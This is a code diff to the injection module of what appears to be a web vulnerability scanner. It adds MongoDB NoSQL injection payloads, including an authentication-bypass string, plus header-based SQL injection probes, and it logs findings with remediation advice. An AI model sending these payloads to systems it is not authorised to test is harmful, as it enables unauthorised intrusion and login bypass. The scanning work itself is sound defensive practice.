@@ -46,11 +46,27 @@ UNION_PAYLOADS = [
 # Error-based payloads
 ERROR_PAYLOADS = ["'", "\"", "1'", "1\"", "';", '";']
 
+# NoSQL injection payloads (MongoDB)
+NOSQL_PAYLOADS = [
+    '{"$gt": ""}',
+    '{"$ne": null}',
+    '{"$regex": ".*"}',
+    '{"$where": "1==1"}',
+    '{"$exists": true}',
+    "admin' || '1'=='1",
+    "' || '1'=='1",
+    '{"username": {"$ne": null}, "password": {"$ne": null}}',
+]
+
 # Common parameters to test
 PARAMS = [
     "id", "q", "search", "page", "user", "name", "email", "username",
     "password", "token", "category", "product", "item", "order", "sort",
-    "filter", "type", "action", "view", "lang",
+    "filter", "type", "action", "view", "lang", "query", "keyword", "term",
+    "text", "message", "comment", "title", "content", "body", "data",
+    "value", "key", "code", "ref", "redirect", "url", "path", "file",
+    "from", "to", "date", "year", "month", "limit", "offset", "start",
+    "end", "per_page", "size", "count", "num", "no", "number",
 ]
 
 # Minimum response size difference to consider a boolean-based finding
@@ -298,6 +314,84 @@ async def _probe_param(ctx, base: str, param: str) -> None:
     await _probe_union_based(ctx, base, param)
 
 
+async def _probe_nosql(ctx, base: str, param: str) -> bool:
+    """NoSQL injection detection."""
+    found = False
+    for payload in NOSQL_PAYLOADS:
+        if not ctx.can_request():
+            return found
+        ctx.increment()
+        baseline_resp = await ctx.http.get(base, params={param: "test"}, timeout=ctx.settings.timeout)
+        baseline_body = (baseline_resp.text or "").lower()
+        baseline_len = len(baseline_body)
+        if not ctx.can_request():
+            return found
+        ctx.increment()
+        resp = await ctx.http.get(base, params={param: payload}, timeout=ctx.settings.timeout)
+        body = (resp.text or "").lower()
+        body_len = len(body)
+        # NoSQL injection often returns more data or different structure
+        if (resp.status_code == 200 and body != baseline_body
+                and body_len > baseline_len + 50
+                and resp.status_code == baseline_resp.status_code):
+            # Verify
+            if not ctx.can_request():
+                return found
+            ctx.increment()
+            verify_resp = await ctx.http.get(base, params={param: payload}, timeout=ctx.settings.timeout)
+            if verify_resp.text == resp.text:
+                ctx.add_finding(Finding(
+                    id=f"nosqli-{param}",
+                    title=f"Potential NoSQL injection via '{param}'",
+                    severity=Severity.HIGH,
+                    confidence=0.7,
+                    asset=f"{base}?{param}={payload}",
+                    module="injection",
+                    description="Response changed with NoSQL operator payload, suggesting NoSQL injection.",
+                    remediation="Use parameterized queries and input validation for NoSQL databases.",
+                    tags=["nosqli", "injection", "mongodb"],
+                ))
+                found = True
+                break
+    return found
+
+
+async def _probe_header_sqli(ctx, base: str) -> bool:
+    """SQL injection via HTTP headers (User-Agent, Referer, X-Forwarded-For)."""
+    found = False
+    headers_to_test = ["User-Agent", "Referer", "X-Forwarded-For", "X-Real-IP", "Cookie"]
+    for header in headers_to_test:
+        for payload in ERROR_PAYLOADS[:3]:
+            if not ctx.can_request():
+                return found
+            ctx.increment()
+            baseline_resp = await ctx.http.get(base, timeout=ctx.settings.timeout)
+            baseline_body = (baseline_resp.text or "").lower()
+            if not ctx.can_request():
+                return found
+            ctx.increment()
+            resp = await ctx.http.get(base, headers={header: payload}, timeout=ctx.settings.timeout)
+            body = (resp.text or "").lower()
+            new_errors = [sig for sig in ERROR_SIGNATURES if sig in body and sig not in baseline_body]
+            if new_errors:
+                ctx.add_finding(Finding(
+                    id=f"sqli-header-{header.lower().replace('-', '_')}",
+                    title=f"Potential SQL injection via '{header}' header",
+                    severity=Severity.HIGH,
+                    confidence=0.75,
+                    asset=base,
+                    module="injection",
+                    description=f"SQL error signature ({new_errors[0]}) detected when injecting via {header} header.",
+                    remediation="Use parameterized queries. Do not interpolate HTTP headers into SQL.",
+                    tags=["sqli", "injection", "header-based"],
+                ))
+                found = True
+                break
+        if found:
+            break
+    return found
+
+
 async def run(ctx) -> None:
     base = f"https://{ctx.target}"
     # Detect WAF on first request
@@ -306,5 +400,14 @@ async def run(ctx) -> None:
         ctx.waf_type = detect_waf(resp.headers, resp.text)
     except Exception:
         ctx.waf_type = None
+
+    # Header-based SQLi
+    await _probe_header_sqli(ctx, base)
+
     tasks = [_probe_param(ctx, base, param) for param in PARAMS]
     await asyncio.gather(*tasks, return_exceptions=True)
+
+    # NoSQL injection (run on a subset of params to save requests)
+    nosql_params = ["username", "email", "user", "password", "name", "search", "q"]
+    nosql_tasks = [_probe_nosql(ctx, base, param) for param in nosql_params if param in PARAMS]
+    await asyncio.gather(*nosql_tasks, return_exceptions=True)
